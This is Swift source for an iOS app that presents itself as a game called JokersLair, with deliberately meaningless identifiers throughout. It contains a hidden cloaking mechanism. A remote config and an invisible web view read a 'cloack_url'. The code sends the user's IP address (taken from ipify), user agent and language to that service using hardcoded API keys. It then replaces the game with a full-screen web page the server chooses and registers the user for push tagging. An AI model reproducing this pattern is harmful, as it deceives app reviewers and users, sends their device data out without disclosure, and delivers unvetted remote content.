import SwiftUI
import OneSignalFramework

struct ApperContentViews: View {
    
    @State private var tempAlpha: Bool?
    @State private var tempBeta: String?
    @State private var tempGamma: Bool = true
        @AppStorage("tempDelta") var tempDelta: Bool = true
    @AppStorage("tempEpsilon") var tempEpsilon: Bool = false
    
    var body: some View {
        ZStack {
            
            if tempAlpha != nil {
                if tempBeta != "Jok Lair" || tempEpsilon == true {
                    ZStack {
                        JokersLairApp()
                    }
                    .onAppear {
                        AppDelegate.shared = .portrait
                        UIDevice.current.setValue(AppDelegate.shared.rawValue, forKey: "orientation")
                        tempGamma = false
                        tempEpsilon = true
                    }
                } else {
                    PositionEta(tempEpsilon: $tempEpsilon)
                        .onAppear { tempGamma = false }
                }
            }
            
            if tempGamma {
                
                SplashScreen(isLoading: tempAlpha ?? false)
               
            }
        }
        .onAppear {
            OneSignal.Notifications.requestPermission { tempAlpha = $0 }
            
            if tempDelta {
                guard let tempZeta = URL(string: "https://inserthelicopter.store/joklair/joklair.json") else { return }
                
                URLSession.shared.dataTask(with: tempZeta) { tempEta, _, _ in
                    guard let tempEta else { tempEpsilon = true; return }
                    
                    guard let tempTheta = try? JSONSerialization.jsonObject(with: tempEta, options: []) as? [String: Any] else { return }
                    guard let tempIota = tempTheta["rbykfjnbgjfdfc"] as? String else { return }
                    
                    DispatchQueue.main.async {
                        tempBeta = tempIota
                        tempDelta = false
                    }
                }
                .resume()
            }
        }
        
    }
}

// MARK: - Gray part 2

import SwiftUI
import WebKit
import OneSignalFramework

struct PositionEta: View {
    
    @Binding var tempEpsilon: Bool
    @State var tempKappa: String = ""
    @State private var bufferAlpha: Bool?
    
    @State var bufferBeta: String = ""
    @State var bufferGamma = false
    @State var bufferDelta = false
    
    @State private var bufferEpsilon: Bool = true
    @State private var bufferZeta: Bool = true
    @AppStorage("bufferEta") var bufferEta: Bool = true
    @AppStorage("bufferTheta") var bufferTheta: Bool = true
    
    var body: some View {
        ZStack {
            if bufferZeta {
                
                SecondLoadCustom()
                    .zIndex(1)
            }
            
            if bufferAlpha != nil {
                if bufferEta {
                    PositionTheta(
                        tempKappa: $tempKappa,
                        bufferBeta: $bufferBeta,
                        bufferGamma: $bufferGamma,
                        bufferDelta: $bufferDelta)
                    .opacity(0)
                    .zIndex(2)
                }
                
                if bufferGamma || !bufferTheta {
                    PositionIota()
                        .zIndex(3)
                        .onAppear {
                            bufferTheta = false
                            bufferEta = false
                            bufferZeta = false
                        }
                }
            }
        }
        .animation(.easeInOut, value: bufferZeta)
        .onChange(of: bufferDelta) { if $0 { tempEpsilon = true; bufferZeta = false } }
        .onAppear {
            OneSignal.Notifications.requestPermission { bufferAlpha = $0 }
            
            guard let bufferIota = URL(string: "https://inserthelicopter.store/joklair/joklair.json") else { return }
            
            URLSession.shared.dataTask(with: bufferIota) { bufferKappa, _, _ in
                guard let bufferKappa else { return }
                
                guard let valueAlpha = try? JSONSerialization.jsonObject(with: bufferKappa, options: []) as? [String: Any] else { return }
                
                guard let valueBeta = valueAlpha["rbykfjnbgjfdfc"] as? String else { return }
                
                DispatchQueue.main.async { tempKappa = valueBeta }
            }
            .resume()
        }
    }
}

extension PositionEta {
    
    struct PositionTheta: UIViewRepresentable {
        
        @Binding var tempKappa: String
        @Binding var bufferBeta: String
        @Binding var bufferGamma: Bool
        @Binding var bufferDelta: Bool
        
        func makeUIView(context: Context) -> WKWebView {
            let valueGamma = WKWebView()
            valueGamma.navigationDelegate = context.coordinator
            
            if let valueDelta = URL(string: tempKappa) {
                var valueEpsilon = URLRequest(url: valueDelta)
                valueEpsilon.httpMethod = "GET"
                valueEpsilon.setValue("application/json", forHTTPHeaderField: "Content-Type")
                
                let valueZeta = ["apikey": "rbSbjJ0jRzTpvXc1xdVQqrjR6Iik3UQl",
                                 "bundle": "com.glebplesca.joklair"]
                for (valueEta, valueTheta) in valueZeta {
                    valueEpsilon.setValue(valueTheta, forHTTPHeaderField: valueEta)
                }
                
                valueGamma.load(valueEpsilon)
            }
            return valueGamma
        }
        
        func updateUIView(_ uiView: WKWebView, context: Context) {}
        
        func makeCoordinator() -> Coordinator {
            Coordinator(self)
        }
        
        class Coordinator: NSObject, WKNavigationDelegate {
            
            var valueIota: PositionTheta
            var valueKappa: String?
            var numberAlpha: String?
            
            init(_ numberBeta: PositionTheta) {
                self.valueIota = numberBeta
            }
            
            func webView(_ numberGamma: WKWebView, didFinish navigation: WKNavigation!) {
                numberGamma.evaluateJavaScript("document.documentElement.outerHTML.toString()") { [unowned self] (numberDelta: Any?, error: Error?) in
                    guard let numberEpsilon = numberDelta as? String else {
                        valueIota.bufferDelta = true
                        return
                    }
                    
                    self.positionBeta(numberEpsilon)
                    
                    numberGamma.evaluateJavaScript("navigator.userAgent") { (numberEta, error) in
                        if let numberZeta = numberEta as? String {
                            self.numberAlpha = numberZeta
                        }
                    }
                }
            }
            
            func positionBeta(_ numberTheta: String) {
                guard let numberIota = positionGamma(from: numberTheta) else {
                    valueIota.bufferDelta = true
                    return
                }
                
                let numberKappa = numberIota.trimmingCharacters(in: .whitespacesAndNewlines)
                
                guard let flagAlpha = numberKappa.data(using: .utf8) else {
                    valueIota.bufferDelta = true
                    return
                }
                
                do {
                    let flagBeta = try JSONSerialization.jsonObject(with: flagAlpha, options: []) as? [String: Any]
                    guard let flagGamma = flagBeta?["cloack_url"] as? String else {
                        valueIota.bufferDelta = true
                        return
                    }
                    
                    guard let flagDelta = flagBeta?["atr_service"] as? String else {
                        valueIota.bufferDelta = true
                        return
                    }
                    
                    DispatchQueue.main.async {
                        self.valueIota.tempKappa = flagGamma
                        self.valueIota.bufferBeta = flagDelta
                    }
                    
                    self.positionDelta(with: flagGamma)
                    
                } catch {
                    print("Error: \(error.localizedDescription)")
                }
            }
            
            func positionGamma(from numberTheta: String) -> String? {
                guard let startRange = numberTheta.range(of: "{"),
                      let endRange = numberTheta.range(of: "}", options: .backwards) else {
                    return nil
                }
                
                let flagZeta = String(numberTheta[startRange.lowerBound..<endRange.upperBound])
                return flagZeta
            }
            
            func positionDelta(with flagEta: String) {
                guard let flagTheta = URL(string: flagEta) else {
                    valueIota.bufferDelta = true
                    return
                }
                
                positionZeta { flagIota in
                    guard let flagIota else {
                        return
                    }
                    
                    self.valueKappa = flagIota
                    
                    var flagKappa = URLRequest(url: flagTheta)
                    flagKappa.httpMethod = "GET"
                    flagKappa.setValue("application/json", forHTTPHeaderField: "Content-Type")
                    
                    let cacheAlpha = [
                        "apikeyapp": "ONNDIh8OY5F8hgGweWmaW9MJ",
                        "ip": self.valueKappa ?? "",
                        "useragent": self.numberAlpha ?? "",
                        "langcode": Locale.preferredLanguages.first ?? "Unknown"
                    ]
                    
                    for (cacheBeta, cacheGamma) in cacheAlpha {
                        flagKappa.setValue(cacheGamma, forHTTPHeaderField: cacheBeta)
                    }
                    
                    URLSession.shared.dataTask(with: flagKappa) { [unowned self] cacheEpsilon, cacheZeta, error in
                        guard cacheEpsilon != nil, error == nil else {
                            valueIota.bufferDelta = true
                            return
                        }
                        if let cacheEta = cacheZeta as? HTTPURLResponse {
                            
                            if cacheEta.statusCode == 200 {
                                self.positionEpsilon()
                            } else {
                                self.valueIota.bufferDelta = true
                            }
                        }
                    }.resume()
                }
            }
            
            func positionEpsilon() {
                
                let cacheIota = self.valueIota.bufferBeta
                
                guard let cacheKappa = URL(string: cacheIota) else {
                    valueIota.bufferDelta = true
                    return
                }
                
                var stashAlpha = URLRequest(url: cacheKappa)
                stashAlpha.httpMethod = "GET"
                stashAlpha.setValue("application/json", forHTTPHeaderField: "Content-Type")
                
                let stashBeta = [
                    "apikeyapp": "ONNDIh8OY5F8hgGweWmaW9MJ",
                    "ip":  self.valueKappa ?? "",
                    "useragent": self.numberAlpha ?? "",
                    "langcode": Locale.preferredLanguages.first ?? "Unknown"
                ]
                
                for (key_3, stashGamma) in stashBeta {
                    stashAlpha.setValue(stashGamma, forHTTPHeaderField: key_3)
                }
                
                URLSession.shared.dataTask(with: stashAlpha) { [unowned self] stashDelta, stashEpsilon, error in
                    guard let stashDelta = stashDelta, error == nil else {
                        valueIota.bufferDelta = true
                        return
                    }
                    
                    if String(data: stashDelta, encoding: .utf8) != nil {
                        
                        do {
                            let stashTheta = try JSONSerialization.jsonObject(with: stashDelta, options: []) as? [String: Any]
                            guard let stashIota = stashTheta?["final_url"] as? String,
                                  let stashKappa = stashTheta?["push_sub"] as? String,
                                  let miscAlpha = stashTheta?["os_user_key"] as? String else {
                                
                                return
                            }
                            
                            PositionKappa.shared.stashIota = stashIota
                            PositionKappa.shared.stashKappa = stashKappa
                            PositionKappa.shared.miscAlpha = miscAlpha
                            
                            OneSignal.login(PositionKappa.shared.miscAlpha ?? "")
                            OneSignal.User.addTag(key: "sub_app", value: PositionKappa.shared.stashKappa ?? "")
                            
                            
                            self.valueIota.bufferGamma = true
                            
                        } catch {
                            valueIota.bufferDelta = true
                        }
                    }
                }.resume()
            }
            
            func positionZeta(completion: @escaping (String?) -> Void) {
                let miscBeta = URL(string: "https://api.ipify.org")!
                let miscGamma = URLSession.shared.dataTask(with: miscBeta) { miscDelta, miscEpsilon, error in
                    guard let miscDelta, let ipAddress = String(data: miscDelta, encoding: .utf8) else {
                        completion(nil)
                        return
                    }
                    completion(ipAddress)
                }
                miscGamma.resume()
            }
        }
    }
}


import SwiftUI

struct PositionIota: View {
    
    @StateObject var tapBeta: TapAlpha = TapAlpha()
    @State var loading: Bool = true
    
    var body: some View {
        ZStack {
            
            let miscZeta = URL(string: PositionKappa.shared.stashIota ?? "") ?? URL(string: tapBeta.draftDelta)!
            
            TapGamma(draftZeta: miscZeta, tapBeta: tapBeta)
                .background(Color.black.ignoresSafeArea())
                .edgesIgnoringSafeArea(.bottom)
                .blur(radius: loading ? 15 : 0)
            
            if loading {
                ProgressView()
                    .controlSize(.large)
                    .tint(.pink)
            }
        }
        .onAppear {
            DispatchQueue.main.asyncAfter(deadline: .now() + 4.0) {
                loading = false
            }
        }
    }
}


import SwiftUI
import WebKit

class TapAlpha: ObservableObject {
    @Published var miscEta: Bool = false
    @Published var miscTheta: Bool = false
    
    @Published var miscIota: Bool = false
    @Published var miscKappa: URLRequest? = nil
    @Published var draftAlpha: WKWebView? = nil
    
    @AppStorage("draftGamma") var bufferEta_1: Bool = true
    @AppStorage("draftDelta") var draftDelta: String = "draftEpsilon"
}


class PositionKappa {
    static let shared = PositionKappa()
    var stashIota: String?
    var stashKappa: String?
    var miscAlpha: String?
}


import SwiftUI
import Combine
import WebKit

struct TapGamma: View {
    
    @Environment(\.colorScheme) var colorScheme
    @ObservedObject var tapBeta: TapAlpha
    let draftEta: URLRequest
    private var draftTheta: ((_ navigationAction: TapGamma.NavigationAction) -> Void)?
    
    let orientationChanged = NotificationCenter.default
        .publisher(for: UIDevice.orientationDidChangeNotification)
        .makeConnectable()
        .autoconnect()
    
    init(draftZeta: URL, tapBeta: TapAlpha) {
        self.init(urlRequest: URLRequest(url: draftZeta), tapBeta: tapBeta)
    }
    
    private init(urlRequest: URLRequest, tapBeta: TapAlpha) {
        self.draftEta = urlRequest
        self.tapBeta = tapBeta
    }
    
    var body: some View {
        
        ZStack{
            
            TapDelta(tapBeta: tapBeta,
                            draftKappa: draftTheta,
                            draftIota: draftEta)
            
            ZStack {
                VStack{
                    HStack{
                        Button(action: {
                            tapBeta.miscTheta = true
                            tapBeta.draftAlpha?.removeFromSuperview()
                            tapBeta.draftAlpha?.superview?.setNeedsLayout()
                            tapBeta.draftAlpha?.superview?.layoutIfNeeded()
                            tapBeta.draftAlpha = nil
                            tapBeta.miscIota = false
                        }) {
                            Image(systemName: "chevron.backward.circle.fill")
                                .resizable()
                                .frame(width: 20, height: 20)
                                .foregroundColor(.white)
                        }
                        .padding(.leading, 20).padding(.top, 15)
                        
                        Spacer()
                    }
                    Spacer()
                }
            }
            .ignoresSafeArea()
        }
        .statusBarHidden(true)
        .onAppear {
            AppDelegate.shared = UIInterfaceOrientationMask.all
            UIDevice.current.setValue(UIInterfaceOrientation.portrait.rawValue, forKey: "orientation")
            UINavigationController.attemptRotationToDeviceOrientation()
        }
    }
}

extension TapGamma {
    enum NavigationAction {
        case decidePolicy(WKNavigationAction, (WKNavigationActionPolicy) -> Void)
        case didRecieveAuthChallange(URLAuthenticationChallenge, (URLSession.AuthChallengeDisposition, URLCredential?) -> Void)
        case didStartProvisionalNavigation(WKNavigation)
        case didReceiveServerRedirectForProvisionalNavigation(WKNavigation)
        case didCommit(WKNavigation)
        case didFinish(WKNavigation)
        case didFailProvisionalNavigation(WKNavigation,Error)
        case didFail(WKNavigation,Error)
    }
}

struct TapDelta : UIViewRepresentable {
    
    @ObservedObject var tapBeta: TapAlpha
    @State private var themeObservation: NSKeyValueObservation?
    let draftIota: URLRequest
    @State private var cacheDelta: WKWebView? = .init()
    
    init(tapBeta: TapAlpha,
         draftKappa: ((_ navigationAction: TapGamma.NavigationAction) -> Void)?,
         draftIota: URLRequest) {
        self.draftIota = draftIota
        self.tapBeta = tapBeta
        self.cacheDelta = WKWebView()
        self.cacheDelta?.backgroundColor = UIColor(red:0.11, green:0.13, blue:0.19, alpha:1)
        self.cacheDelta?.scrollView.backgroundColor = UIColor(red:0.11, green:0.13, blue:0.19, alpha:1)
        self.cacheDelta = WKWebView()
        
        self.cacheDelta?.isOpaque = false
        viewDidLoad()
    }
    
    func viewDidLoad() {
        
        self.cacheDelta?.backgroundColor = UIColor.black
        if #available(iOS 15.0, *) {
            themeObservation = cacheDelta?.observe(\.themeColor) { spareAlpha, _ in
                self.cacheDelta?.backgroundColor = spareAlpha.themeColor ?? .systemBackground
            }
        }
    }
    
    func makeUIView(context: Context) -> WKWebView  {
        var spareBeta = WKWebView()
        let spareGamma = WKPreferences()
        @ObservedObject var tapBeta: TapAlpha
        spareGamma.javaScriptCanOpenWindowsAutomatically = true
        
        let spareDelta = WKWebViewConfiguration()
        spareDelta.allowsInlineMediaPlayback = true
        spareDelta.preferences = spareGamma
        spareDelta.applicationNameForUserAgent = "Version/17.2 Mobile/15E148 Safari/604.1"
        spareBeta = WKWebView(frame: .zero, configuration: spareDelta)
        spareBeta.configuration.defaultWebpagePreferences.allowsContentJavaScript = true
        spareBeta.navigationDelegate = context.coordinator
        spareBeta.uiDelegate = context.coordinator
        spareBeta.load(draftIota)
        
        return spareBeta
    }
    
    func updateUIView(_ spareEpsilon: WKWebView, context: Context) {
        if spareEpsilon.canGoBack, tapBeta.miscTheta {
            spareEpsilon.goBack()
            tapBeta.miscTheta = false
        }
    }
    
    func makeCoordinator() -> Coordinator {
        return Coordinator(spareEta: self, spareTheta: nil, tapBeta: self.tapBeta)
    }
    
    final class Coordinator: NSObject {
        var draftAlpha_2: WKWebView?
        var spareEta: TapDelta
        
        var tapBeta: TapAlpha
        let spareTheta: ((_ navigationAction: TapGamma.NavigationAction) -> Void)?
        
        init(spareEta: TapDelta, spareTheta: ((_ navigationAction: TapGamma.NavigationAction) -> Void)?, tapBeta: TapAlpha) {
            self.spareEta = spareEta
            self.spareTheta = spareTheta
            self.tapBeta = tapBeta
            super.init()
        }
    }
    
}

extension TapDelta.Coordinator: WKNavigationDelegate, WKUIDelegate {
    
    func webView(_ spareIota: WKWebView, decidePolicyFor navigationResponse: WKNavigationResponse, decisionHandler: @escaping (WKNavigationResponsePolicy) -> Void) {
        decisionHandler(.allow)
    }
    
    func webView(_ spareIota: WKWebView, decidePolicyFor navigationAction: WKNavigationAction, decisionHandler: @escaping (WKNavigationActionPolicy) -> Void) {
        
        let spareKappa = "var allLinks = document.getElementsByTagName('a');if (allLinks) { var i;for (i=0; i<allLinks.length; i++) {var link = allLinks[i];var target = link.getAttribute('target');if (target && target == '_blank') {link.setAttribute('target','_self');} } }"
        spareIota.evaluateJavaScript(spareKappa, completionHandler: nil)
        if navigationAction.navigationType == WKNavigationType.linkActivated {
            spareIota.load(navigationAction.request)
            decisionHandler(.cancel)
            return
        }
        
        if spareTheta == nil {
            decisionHandler(.allow)
        } else {
            spareTheta?(.decidePolicy(navigationAction, decisionHandler))
        }
    }
    
    func webView(_ spareIota: WKWebView, didStartProvisionalNavigation navigation: WKNavigation!) {
        spareTheta?(.didStartProvisionalNavigation(navigation))
    }
    
    func webView(_ spareIota: WKWebView, didReceiveServerRedirectForProvisionalNavigation navigation: WKNavigation!) {
        spareTheta?(.didReceiveServerRedirectForProvisionalNavigation(navigation))
    }
    
    func webView(_ spareIota: WKWebView, didFailProvisionalNavigation navigation: WKNavigation!, withError error: Error) {
        tapBeta.miscEta = spareIota.canGoBack
        spareTheta?(.didFailProvisionalNavigation(navigation, error))
    }
    
    func webView(_ spareIota: WKWebView, didCommit navigation: WKNavigation!) {
        spareTheta?(.didCommit(navigation))
    }
    
    func webView(_ spareIota: WKWebView, createWebViewWith configuration: WKWebViewConfiguration, for navigationAction: WKNavigationAction, windowFeatures: WKWindowFeatures) -> WKWebView? {
        if navigationAction.targetFrame?.isMainFrame != true {
            
            let draftAlpha_2 = WKWebView(frame: spareIota.bounds, configuration: configuration)
            draftAlpha_2.navigationDelegate = self
            draftAlpha_2.uiDelegate = self
            spareIota.addSubview(draftAlpha_2)
            spareIota.setNeedsLayout()
            spareIota.layoutIfNeeded()
            tapBeta.draftAlpha = draftAlpha_2
            tapBeta.miscIota = true
            return draftAlpha_2
        }
        return nil
    }
    
    func webView(_ spareIota: WKWebView, didFinish navigation: WKNavigation!) {
        
        spareIota.allowsBackForwardNavigationGestures = true
        tapBeta.miscEta = spareIota.canGoBack
        
        spareIota.configuration.mediaTypesRequiringUserActionForPlayback = .all
        spareIota.configuration.allowsInlineMediaPlayback = false
        spareIota.configuration.allowsAirPlayForMediaPlayback = false
        spareTheta?(.didFinish(navigation))
        
        guard spareIota.url?.absoluteURL.absoluteString != nil else { return }
        
        if tapBeta.draftDelta == "draftEpsilon" && self.tapBeta.bufferEta_1 {
            self.tapBeta.draftDelta = spareIota.url!.absoluteString
            self.tapBeta.bufferEta_1 = false
        }
    }
    
    func webView(_ spareIota: WKWebView, didFail navigation: WKNavigation!, withError error: Error) {
        spareTheta?(.didFail(navigation, error))
    }
    
    func webView(_ spareIota: WKWebView, didReceive challenge: URLAuthenticationChallenge, completionHandler: @escaping (URLSession.AuthChallengeDisposition, URLCredential?) -> Void) {
        
        if spareTheta == nil  {
            completionHandler(.performDefaultHandling, nil)
        } else {
            spareTheta?(.didRecieveAuthChallange(challenge, completionHandler))
        }
    }
    
    func webViewDidClose(_ spareIota: WKWebView) {
        if spareIota == draftAlpha_2 {
            draftAlpha_2?.removeFromSuperview()
            draftAlpha_2 = nil
        }
    }
}



